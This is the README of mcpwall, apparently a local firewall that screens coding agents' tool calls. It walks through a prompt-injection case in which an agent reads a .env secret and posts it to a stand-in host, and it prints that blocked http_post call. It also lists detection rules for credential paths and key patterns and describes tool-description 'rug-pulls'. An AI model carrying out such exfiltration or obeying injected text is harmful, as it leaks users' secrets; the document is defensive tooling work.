# mcpwall

**A local application firewall for coding agents.** Little Snitch, but for AI
agent tool calls.

[Français](README.fr.md) · [Specification](SPEC.md) · [Contributing](CONTRIBUTING.md) · MIT

---

## "My client already asks me for permission. Why would I need this?"

Because your client's permissions are at the **tool** level, and they disappear
under auto-accept. Once you have approved `Bash`, you have approved every
command it will ever run.

mcpwall filters at the level of **argument contents**, keeps an **audit trail
across sessions**, and covers the **third-party servers you approved months
ago** — once and for all.

## The attack it exists for

You run your agent in auto-accept. A GitHub issue, a web page or an email
contains a prompt injection. The agent reads a local secret, then sends it to a
network tool.

Your client sees a sequence of already-authorised tool calls. Nothing about it
looks wrong.

mcpwall watches what came back from the read, recognises it in what is about to
leave, and stops the call:

```
tools/call  http_post  {"url": "https://collect.example", "body": "rk_live_…"}

→ blocked by mcpwall: tainted local data in an outbound argument
  [local data read from /Users/you/project/.env] (rule: taint_exfil)
```

The agent receives that as an **ordinary tool failure** — a valid result with
`isError: true`. It reads the reason, adapts, and carries on. mcpwall never
closes the connection and never returns a protocol error: a firewall that kills
the session is a firewall you uninstall.

## What it catches out of the box

The default `~/.mcpwall/policy.yaml` is deliberately short. Only high-confidence
rules interrupt, because alert fatigue is what kills this kind of tool.

| Rule | Fires when | Action |
| --- | --- | --- |
| `taint_exfil` | data read locally in the last 10 min appears in an outbound call | **deny** |
| `secrets_paths` | an argument points at `.env`, `~/.ssh/**`, `~/.aws/**`, `id_rsa`, `.netrc` | ask |
| `secret_pattern` | an argument looks like a credential — AWS key, `ghp_`, `sk-`, PEM private key | ask |
| `outside_project_write` | a write, edit or delete lands outside the current project | ask |
| `tool_description_changed` | a server rewrote a tool's description since you approved it | ask |

Only `taint_exfil` denies outright: there is no legitimate reading of a secret
being posted to the network. Everything else asks, and the file is yours to
edit — it hot-reloads.

That last rule is the **rug-pull**: a server serves an honest `tools/list` while
it is being reviewed and a different one a month later. The description is not
documentation — it is the text your model reads to decide when to reach for the
tool. Every name and permission stays as it was.

## Coverage — what it sees, and what it does not

Being honest about coverage is a credibility argument, not a weakness.

| | Covered |
| --- | --- |
| MCP servers over stdio | **yes** |
| MCP servers over streamable HTTP | **yes** — via a loopback proxy (see below) |
| Claude Code built-ins (`Read`, `Edit`, `Bash`, `WebFetch`) | **yes** — `PreToolUse` / `PostToolUse` hooks |
| Cursor | MCP traffic only |
| Codex built-ins | **no** — its security model goes through the sandbox |

**Claude Code's built-in tools never touch MCP**, and they are most of the
attack surface. A proxy alone would watch the wrong door: the whole attack above
can happen with `Bash` and `WebFetch` and no server at all. `mcpwall init`
installs a hook that answers to the same daemon, the same policy and the same
journal, so that path is covered too.

**Streamable HTTP works differently, and you should know how before relying on
it.** A stdio server is *started by your client*, with mcpwall as its command —
if mcpwall is missing, the server simply runs. An HTTP client opens a socket to
a URL, so the only way to interpose is to **be** the URL: `init` re-points your
configuration at a local proxy on `127.0.0.1`. While that proxy is stopped, the
servers routed through it are unreachable. There is no failing open, because
there is nothing left to fail open to. The app supervises it, and `mcpwall
restore` puts your original URLs back.

## How it fits together

```
MCP client ──stdio/http──▶ mcpwall shim ──▶ upstream MCP server
                                │
Claude Code ──PreToolUse hook───┤   Unix socket (verdict)
                                ▼
                        mcpwall daemon ──▶ SQLite journal
                     (policy · taint · drift)
                                │
                          menu bar app
```

One binary with subcommands, so a shim and a daemon can never drift in version.
One daemon per machine. The shim is deliberately dumb — parse, relay, ask for a
verdict, apply it — and all the logic lives in the daemon. The macOS app does
not reimplement the daemon; it supervises it as a child process.

**It stays out of the way.** Measured passthrough latency, in release:

| | p50 | p99 |
| --- | --- | --- |
| short frame | 1.4 µs | 5.3 µs |
| method pushed out of the scan window | 3.0 µs | 10.0 µs |
| 100 KB frame | 47 µs | 110 µs |

The budget is 5 ms, and CI fails if it is exceeded.

## Install

```sh
./scripts/build-app.sh
open build/mcpwall.app
```

The app starts the daemon, creates a stable symlink to the binary, and offers to
install itself into your MCP clients on first launch — **showing you the diff
before writing anything**. Configurations point at the symlink, never at the
bundle, so moving the app cannot break your servers.

> ⚠️ **No distributable build yet.** The `.dmg` is neither signed nor notarised,
> so Gatekeeper forces a right click → Open — exactly the friction a "no
> terminal required" install is supposed to remove. Signing needs a Developer ID
> identity; Sparkle needs a published feed and an EdDSA key pair. Neither exists
> yet. See [issue #6](https://github.com/Itaromi/mcpwall/issues/6).

### From the command line, with no interface

```sh
cargo build --release

# 1. the daemon, which writes a default policy on first launch
./target/release/mcpwall daemon &

# 2. see what init would do — nothing is written without --apply
./target/release/mcpwall init

# 3. apply it, then restart your MCP clients
./target/release/mcpwall init --apply

# 4. watch the traffic go by
./target/release/mcpwall log --follow
./target/release/mcpwall log --stats
```

`mcpwall restore` puts every configuration back from its backup, with one
command.

Without the app running, an `ask` rule **blocks** instead of asking — there is
nobody there to confirm. The message returned to the agent says so explicitly,
so you are never left guessing why a tool failed.

## Principles

- **Local-first.** No telemetry, no account, no outbound request other than the
  update check.
- **Deterministic.** No LLM analysis of calls. The policy is a file you can read
  and predict, top to bottom, first match wins.
- **Available by default.** If the daemon is unreachable, traffic goes through.
  Breaking every one of your MCP servers because an app was closed is a defect,
  not a security posture.
- **Unobtrusive.** Only high-confidence rules interrupt. A rule that fires
  wrongly teaches you to click "allow" without reading, which negates the entire
  product.
- **It never keeps your secrets.** The taint store holds 64-bit fingerprints and
  nothing else. It can say *this went out*; it can never give back *what*.

## Development

```sh
cargo test                                          # 228 tests, fake servers included
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --check
cargo test --release --test bench -- --nocapture     # latency, 5 ms p99 threshold

cd app && swift build                               # the application
```

CI runs the core on **macOS and Linux** — the product is macOS, but the core is
meant to stay portable.

The test suite starts real processes on purpose: fake MCP servers that return
malformed JSON, ignore `SIGTERM`, die mid-message, answer with 8 MB, or rewrite
their tool descriptions between two listings. The defects those target —
orphans, deadlocks, badly closed descriptors — are precisely the ones no mocked
test will ever see.

The app's universal build requires Xcode; with the Command Line Tools alone,
`scripts/build-app.sh` degrades to the native architecture and warns you. CI
checks that published binaries really are universal.

## Design decisions

[SPEC.md](SPEC.md) is the reference document, and its decision log records why
each choice was made — including the ones that were wrong first. If you are
about to ask "why on earth is it done that way", the answer is probably there.

## Licence

MIT.
